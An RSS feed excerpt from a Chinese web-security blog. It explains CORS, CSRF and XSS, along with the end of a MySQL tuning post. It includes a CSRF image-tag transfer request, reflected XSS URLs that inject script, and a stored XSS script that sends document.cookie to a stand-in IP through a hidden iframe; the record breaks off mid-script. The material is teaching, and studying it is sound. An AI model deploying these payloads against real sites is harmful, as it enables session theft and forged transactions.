&lt;p>&lt;a href="https://img3.doubanio.com/view/note/large/public/p10068772.jpg!%5Bimage_1btlji639gf719d45kp1eag11kmp.png-188.3kB%5D%5B3%5D">https://img3.doubanio.com/view/note/large/public/p10068772.jpg![image_1btlji639gf719d45kp1eag11kmp.png-188.3kB][3]&lt;/a>
&lt;a href="https://img1.doubanio.com/view/note/large/public/p10068778.jpg!%5Bimage_1btljifq510oa66b14tk1v4ngfh16.png-167.2kB%5D%5B4%5D">https://img1.doubanio.com/view/note/large/public/p10068778.jpg![image_1btljifq510oa66b14tk1v4ngfh16.png-167.2kB][4]&lt;/a>&lt;/p>
&lt;p>关于 Using Where：
&lt;a href="https://img3.doubanio.com/view/note/large/public/p10073361.jpg!%5Bimage_1btljj0h51at71cnakhjt921vd61j.png-145.8kB%5D%5B5%5D">https://img3.doubanio.com/view/note/large/public/p10073361.jpg![image_1btljj0h51at71cnakhjt921vd61j.png-145.8kB][5]&lt;/a>&lt;/p>
&lt;h2 id="show-profile-分析-sql">show profile 分析 SQL&lt;/h2>
&lt;p>show profle 能够在做 SQL 优化时帮助我们了解时间都耗费到哪里去了。
通常来说，对于一般的开发人员来讲 Explain 已经足够解决问题了。对于相关 show profile 的信息请查阅 mysql 官方手册。&lt;/p>
&lt;h2 id="trace-分析优化器">trace 分析优化器&lt;/h2>
&lt;p>mysql 5.6 提供了对 SQL 的跟踪 trace。该功能进一步展示了优化器是如何选择执行计划的。对于开发人员来讲，explain 是最常用的分析手段。若对 trace 有兴趣请查阅相关的 mysql 官方手册。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>性能优化最忌讳之一便是无用功优化。准确的找出问题 SQL 以及分析其原因，是优化 SQL 语句的第一步也是最重要的一步。&lt;/p>
&lt;hr>
&lt;p>&lt;em>参考书籍&lt;/em>
&lt;em>《深入浅出 mysql》&lt;/em>&lt;/p></description></item><item><title>跨域资源访问</title><link>https://www.chucklin.net/post/cors/</link><pubDate>Wed, 19 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/cors/</guid><description>&lt;h2 id="跨域">跨域&lt;/h2>
&lt;p>当一个资源请求一个其它域名或者另外一个端口的资源时会产生一个跨域 HTTP 请求(cross-origin HTTP request)。比如说，http://domaina.example 的某 HTML 页面通过 img 的 src 请求 &lt;a href="http://domainb.foo/image.jpg">http://domainb.foo/image.jpg&lt;/a>。在当今的 Web 开发中，许多页面都会从另外一个站点加载各类资源（包括 CSS、图片、JavaScript 脚本以及其它类资源）。&lt;/p>
&lt;p>针对不同的来源的各类资源的交互，各大浏览器往往遵循「同源策略」，对交互进行处理。&lt;/p>
&lt;h2 id="同源策略">同源策略&lt;/h2>
&lt;p>同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。如果协议，端口（如果指定了一个）和主机对于两个页面是相同的，则两个页面具有相同的源。
下表给出了相对 &lt;a href="http://store.company.com/dir/page.html">http://store.company.com/dir/page.html&lt;/a> 同源检测的示例:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>URL&lt;/th>
&lt;th style="text-align:right">结果&lt;/th>
&lt;th style="text-align:center">原因&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com/dir2/other.html">http://store.company.com/dir2/other.html&lt;/a>&lt;/td>
&lt;td style="text-align:right">成功&lt;/td>
&lt;td style="text-align:center">dir2/other.html&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com/dir/inner/another.html">http://store.company.com/dir/inner/another.html&lt;/a>&lt;/td>
&lt;td style="text-align:right">成功&lt;/td>
&lt;td style="text-align:center">dir/inner/another.html&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://store.company.com/secure.html">https://store.company.com/secure.html&lt;/a>&lt;/td>
&lt;td style="text-align:right">失败&lt;/td>
&lt;td style="text-align:center">不同的协议 ( https )&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://store.company.com:81/dir/etc.html">http://store.company.com:81/dir/etc.html&lt;/a>&lt;/td>
&lt;td style="text-align:right">失败&lt;/td>
&lt;td style="text-align:center">不同的端口 ( 81 )&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="http://news.company.com/dir/other.html">http://news.company.com/dir/other.html&lt;/a>&lt;/td>
&lt;td style="text-align:right">失败&lt;/td>
&lt;td style="text-align:center">不同的主机（主机）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="常见跨源网络访问">常见跨源网络访问&lt;/h3>
&lt;p>同源策略控制了不同源之间的交互，例如在使用 XMLHttpRequest 或 img 标签时则会受到同源策略的约束。交互通常分为三类：&lt;/p>
&lt;ul>
&lt;li>通常允许进行跨域写操作（Cross-origin writes）。例如链接（links），重定向以及表单提交。特定少数的 HTTP 请求需要添加 preflight。&lt;/li>
&lt;li>通常允许跨域资源嵌入（Cross-origin embedding）。之后下面会举例说明。&lt;/li>
&lt;li>通常不允许跨域读操作（Cross-origin reads）。但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或 availability of an embedded resource.&lt;/li>
&lt;/ul>
&lt;h3 id="常见跨域资源嵌入示例">常见跨域资源嵌入示例&lt;/h3>
&lt;ul>
&lt;li>&lt;code>&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li>
&lt;li>&lt;code>&amp;lt;img&amp;gt;&lt;/code>嵌入图片。支持的图片格式包括 PNG,JPEG,GIF,BMP,SVG,&amp;hellip;&lt;/li>
&lt;li>&lt;code>&amp;lt;video&amp;gt;&lt;/code> 和 &lt;code>&amp;lt;audio&amp;gt;&lt;/code>嵌入多媒体资源。&lt;/li>
&lt;/ul>
&lt;p>可见，在通常情况下使用 XMLHttpRequest 的跨域读取操作将会受到限制，而&lt;code>&amp;lt;img&amp;gt;&lt;/code>的资源嵌入操作则可以执行。不过，若当前环境希望用户能够自由请求服务器，不受同源策略限制应该怎么办？这样的问题，就需要引入 CORS。&lt;/p>
&lt;h2 id="cors">CORS&lt;/h2>
&lt;p>是一种跨域资源共享（Cross-origin resource sharing）的解决方案。它定义了一种浏览器和服务器交互的方式来确定是否允许跨域请求。
它是一个妥协，有更大的灵活性，但比起简单地允许所有这些的要求来说更加安全。简言之，CORS 就是为了让 AJAX 可以实现可控的跨域访问而生的。通常我们采用配置 http response header 的方式就可以启用 CORS：&lt;code>Access–Control-Allow-Origin: * &lt;/code>&lt;/p>
&lt;h3 id="启用-cors-带来的安全隐患">启用 CORS 带来的安全隐患&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>恶意跨域请求
即便页面只允许来自某个信任网站的请求，但是它也会收到大量来自其他域的跨域请求。.这些请求有时可能会被用于执行应用层面的 DDOS 攻击，并不应该被应用来处理。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>假定一个内部站点开启了 CORS，如果内部网络的用户访问了恶意网站，恶意网站可以通过 CORS（跨域请求）来获取到内部站点的内容。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>属于不同源的资源之间互相请求时会产生「跨域访问」的问题。各大浏览器通常基于「同源策略」对跨域访问进行处理。而 CORS 则提供了跨域资源共享的解决方案，使的同源策略能够通过 CORS 变得更加的灵活，以满足不同场景的需要。&lt;/p></description></item><item><title>CSRF/XSRF 跨站请求伪造</title><link>https://www.chucklin.net/post/csrf/</link><pubDate>Tue, 18 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/csrf/</guid><description>&lt;p>CSRF（Cross Site Request Forgery, 跨站域请求伪造）也称 XSRF， 是一种网络的攻击方式，它在 2007 年曾被列为互联网 20 大安全隐患之一。其他安全隐患，比如 SQL 脚本注入，跨站域脚本攻击等在近年来已经逐渐为众人熟知，很多网站也都针对他们进行了防御。然而，对于大多数人来说，CSRF 却依然是一个陌生的概念。即便是大名鼎鼎的 Gmail, 在 2007 年底也存在着 CSRF 漏洞，从而被黑客攻击而使 Gmail 的用户造成巨大的损失。&lt;/p>
&lt;h2 id="同源策略带来的安全隐患">同源策略带来的安全隐患&lt;/h2>
&lt;p>回顾上一章节的内容我们有提到，在浏览器的同源策略的约束下，对于跨域资源交互进行处理时，通常允许跨「域资源嵌入（Cross-origin embedding）」。&lt;/p>
&lt;p>下面是常见跨域资源嵌入示例：&lt;/p>
&lt;ul>
&lt;li>&lt;code>&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li>
&lt;li>&lt;code>&amp;lt;img&amp;gt;&lt;/code>嵌入图片。支持的图片格式包括 PNG,JPEG,GIF,BMP,SVG,&amp;hellip;&lt;/li>
&lt;li>&lt;code>&amp;lt;video&amp;gt;&lt;/code> 和 &lt;code>&amp;lt;audio&amp;gt;&lt;/code>嵌入多媒体资源。&lt;/li>
&lt;/ul>
&lt;p>CSRF 攻击的原理，就是利用由于浏览器的同源策略对以上嵌入资源不做限制的行为进行跨站请求伪造的。&lt;/p>
&lt;h2 id="csrf-攻击原理">CSRF 攻击原理&lt;/h2>
&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/ta5h6dxooi0wzkkqq1st8y7n/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-04-03%20%E4%B8%8B%E5%8D%8812.11.03.png" alt="屏幕快照 2017-04-03 下午12.11.03.png-62.4kB">&lt;/p>
&lt;ol>
&lt;li>用户浏览位于目标服务器 A 的网站。并通过登录验证。&lt;/li>
&lt;li>获取到 cookie_session_id，保存到浏览器 cookie 中。&lt;/li>
&lt;li>在未登出服务器 A ，并在 session_id 失效前用户浏览位于 hacked server B 上的网站。&lt;/li>
&lt;li>server B 网站中的&lt;code>&amp;lt;img src = &amp;quot;http://www.altoromutual.com/bank/transfer.aspx?creditAccount=1001160141&amp;amp;transferAmount=1000&amp;quot;&amp;gt;&lt;/code>嵌入资源起了作用，迫使用户访问目标服务器 A&lt;/li>
&lt;li>由于用户未登出服务器 A 并且 sessionId 未失效，请求通过验证，非法请求被执行。&lt;/li>
&lt;/ol>
&lt;h2 id="如何防御-csrf">如何防御 CSRF&lt;/h2>
&lt;p>&lt;strong>referer 验证解决方案&lt;/strong>
最简单的方法依赖于浏览器引用页头部。大多数浏览器会告诉 Web 服务器，哪个页面发送了请求。如：&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /bank/transfer.aspx HTTP/1.1
Referer: http://evilsite.com/myevilblog
User-Agent: Mozilla/4....
Host: www.altoromutual.com
Content-Length: 42
Cookie: SessionId=x3q2v0qpjc0n1c55mf35fxid;
&lt;/code>&lt;/pre>&lt;p>不少站点通过 referer 验证来防止盗链本站图片资源。
不过由于 http 头在某些版本的浏览器上存在可被篡改的可能性，所以这个解决方案并不完善。&lt;/p>
&lt;p>&lt;strong>Token 解决方案&lt;/strong>
令牌解决方案向表单添加一个参数，让表单在用户注销时或一个超时期限结束后过期&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;form id=&amp;quot;transferForm&amp;quot; action=&amp;quot;https://www.altoromutual.com/bank/transfer.aspx&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
Enter the credit account:
&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;creditAccount&amp;quot; value=&amp;quot;&amp;quot;&amp;gt;
Enter the transfer amount:
&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;transferAmount&amp;quot; value=&amp;quot;&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;xsrftoken&amp;quot; value=&amp;quot;JKBS38633jjhg0987PPll&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code>&lt;/pre>&lt;p>或者将服务端动态生成的 Token 加入到 自定义 http 请求头参数中&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /bank/transfer.aspx HTTP/1.1
Referer: https://www.altoromutual.com/bank
xsrftoken: JKBS38633jjhg0987PPll
User-Agent: Mozilla/4....
Host: www.altoromutual.com
Content-Length: 42
Cookie: SessionId=x3q2v0qpjc0n1c55mf35fxid;
creditAccount=1001160141&amp;amp;transferAmount=10
&lt;/code>&lt;/pre>&lt;p>token 解决方案的问题在于前后端代码的巨大变更。并且每一步都动态生成 token 并且对 token 进行验证的话，也会造成额外的资源开销。可以尝试在关键性操作的地方再加上 token 验证逻辑。但是，token 验证所带来的前后端代码的变动所带来的消耗，则需要慎重考虑。&lt;/p>
&lt;p>&lt;strong>userId 解决方案&lt;/strong>
相对于 token 这样的需要前后端逻辑作出改动，以及造成额外资源开销的方式以外还有一种小巧的防范措施。就是用户每次请求关键性数据时，后端接口在设计时都需要用户提交相关的 userId。userId 可以存储到浏览器的 localStorage 中，这样便能进一步提高接口安全性，防止跨站请求伪造。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>要记住 CSRF 不是黑客唯一的攻击手段，无论你 CSRF 防范有多么严密，如果你系统有其他安全漏洞，比如跨站域脚本攻击 XSS，那么黑客就可以绕过你的安全防护，展开包括 CSRF 在内的各种攻击，你的防线将如同虚设。&lt;/p>
&lt;p>CSRF 是一种危害非常大的攻击，又很难以防范。目前几种防御策略虽然可以很大程度上抵御 CSRF 的攻击，但并没有一种完美的解决方案。一些新的方案正在研究之中，比如对于每次请求都使用不同的动态口令，把 Referer 和 token 方案结合起来，甚至尝试修改 HTTP 规范，但是这些新的方案尚不成熟，要正式投入使用并被业界广为接受还需时日。在这之前，我们只有充分重视 CSRF，根据系统的实际情况选择最合适的策略，这样才能把 CSRF 的危害降到最低。&lt;/p>
&lt;hr>
&lt;p>参考链接&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md">避免 SQL 注入&lt;/a>, by wuyuanwei&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://liuwanlin.info/webgong-ji-yu-fang-hu/">Web 攻击与防护&lt;/a>, by liuwulin&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/">总结 XSS 与 CSRF 两种跨站攻击&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">XSS 攻击入门&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://blog.wilddog.com/?p=290">关于 Web 安全，99%的网站都忽略了这些&lt;/a>, by wilddog&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.ibm.com/developerworks/cn/web/se-appscan-detect-csrf-xsrf/">预防跨站点请求伪造：了解浏览器选项卡中的隐藏危险&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.importnew.com/5839.html">CSRF 攻击的应对之道&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>XSS 跨站脚本攻击</title><link>https://www.chucklin.net/post/xss/</link><pubDate>Mon, 17 Feb 2020 09:51:00 +0800</pubDate><guid>https://www.chucklin.net/post/xss/</guid><description>&lt;p>随着互联网技术的发展，现在的 Web 应用都含有大量的动态内容以提高用户体验。所谓动态内容，就是应用程序能够根据用户环境和用户请求，输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。&lt;/p>
&lt;h2 id="什么是-xss">什么是 XSS&lt;/h2>
&lt;p>XSS 是一种常见的 web 安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击(一般只涉及攻击者和受害者)，XSS 涉及到三方，即攻击者、客户端与 Web 应用。XSS 的攻击目标是为了盗取存储在客户端的 cookie 或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。&lt;/p>
&lt;p>总之，XSS 能做用户使用浏览器能做的一切事情。包括获取用户的 cookie 等重要隐私信息的操作。另外，同源策略无法保证不受 XSS 攻击，因为此时攻击者就在同源之内。&lt;/p>
&lt;h2 id="xss-工作原理">XSS 工作原理&lt;/h2>
&lt;p>XSS 通常可以分为两大类：&lt;/p>
&lt;ul>
&lt;li>客户端型&lt;/li>
&lt;li>服务端型&lt;/li>
&lt;/ul>
&lt;p>无论是哪一种 XSS，其目前主要的手段和目的如下：&lt;/p>
&lt;ul>
&lt;li>盗用 cookie，获取敏感信息。&lt;/li>
&lt;li>利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。&lt;/li>
&lt;li>利用 iframe、frame、XMLHttpRequest 或上述 Flash 等方式，以（被攻击者）- 用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次 XSS。&lt;/li>
&lt;li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。&lt;/li>
&lt;li>在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DDoS 攻击的效果&lt;/li>
&lt;/ul>
&lt;h3 id="客户端型-xss-攻击">客户端型 xss 攻击&lt;/h3>
&lt;p>客户端型 xss 攻击是一次性的，仅对当次的页面访问产生影响。客户端型 xss 攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。&lt;/p>
&lt;p>假设有以下 index.php 页面：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
$name &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Welcome &lt;/span>&lt;span style="color:#e6db74">$name&lt;/span>&lt;span style="color:#e6db74">&amp;lt;br&amp;gt;&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;a href=&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">www&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">cnblogs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">com&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">bangerlee&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;gt;Click to Download&amp;lt;/a&amp;gt;&amp;#34;&lt;/span>;
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该页面显示两行信息：
从 URI 获取 &amp;lsquo;name&amp;rsquo; 参数，并在页面显示跳转到一条 URL 的链接，这时  攻击者给出以下 URL 链接：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#a6e22e">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">guest&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;attacked&amp;#39;&lt;/span>)&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当用户点击该链接时，将产生以下 html 代码，带 attacked 的告警提示框弹出：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#a6e22e">Welcome&lt;/span> &lt;span style="color:#a6e22e">guest&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;attacked&amp;#39;&lt;/span>)&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">br&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://www.cnblogs.com/bangerlee/&amp;#39;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">Click&lt;/span> &lt;span style="color:#a6e22e">to&lt;/span> &lt;span style="color:#a6e22e">Download&lt;/span>&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>除了插入 alert 代码，攻击者还可以通过以下 URL 实现修改链接的目的：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#a6e22e">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#a6e22e">window&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>() {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">link&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">document&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getElementsByTagName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>);&lt;span style="color:#a6e22e">link&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://attacker-site.com/&amp;#34;&lt;/span>;}
&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当用户点击以上攻击者提供的 URL 时，index.php 页面被植入脚本，页面源码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#a6e22e">window&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>() {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">link&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">document&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getElementsByTagName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>);&lt;span style="color:#a6e22e">link&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://attacker-site.com/&amp;#34;&lt;/span>;}
&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">br&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://www.cnblogs.com/bangerlee/&amp;#39;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">Click&lt;/span> &lt;span style="color:#a6e22e">to&lt;/span> &lt;span style="color:#a6e22e">Download&lt;/span>&lt;span style="color:#f92672">&amp;lt;/&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用户再点击 &amp;ldquo;Click to Download&amp;rdquo; 时，将跳转至攻击者提供的链接。&lt;/p>
&lt;h2 id="服务端型-xss-攻击">服务端型 XSS 攻击&lt;/h2>
&lt;p>服务端型的 XSS 攻击与客户端型的运行原理类似， 其本质上是注入攻击。区别在于服务端型的恶意代码可以复用，并且不需要引诱用户点击某个连接。&lt;/p>
&lt;p>还记得之前浏览器同源策略的知识吗？浏览器的同源策略虽然对 ajax 请求做了限制，现代浏览器对于某些 xss 代码也做了过滤。但是，对于服务端返回的嵌入式资源的跨域交互是允许的！&lt;/p>
&lt;p>黑客将将恶意代码通过某个操作，写入被攻击服务器的数据库中，接着在某个数据列表展示页面中通过嵌入 js 代码，迫使用户的浏览器执行恶意 javascript 代码来达到 XSS 攻击的目的。
就像下面这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">// 用 &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 包起来放在评论中
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
(&lt;span style="color:#66d9ef">function&lt;/span> (window, document) {
&lt;span style="color:#75715e">// 构造泄露信息用的 URL
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">cookie&lt;/span>;
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">xssURIBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://192.168.123.123/myxss/&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">xssURI&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">xssURIBase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> window.encodeURI(&lt;span style="color:#a6e22e">cookies&lt;/span>);
&lt;span style="color:#75715e">// 建立隐藏 iframe 用于通讯
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">hideFrame&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">createElement&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;iframe&amp;#34;&lt;/span>);
&lt;span style="color:#a6e22e">hideFrame&lt;/span>.&lt;span style="color:#a6e22e">height&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
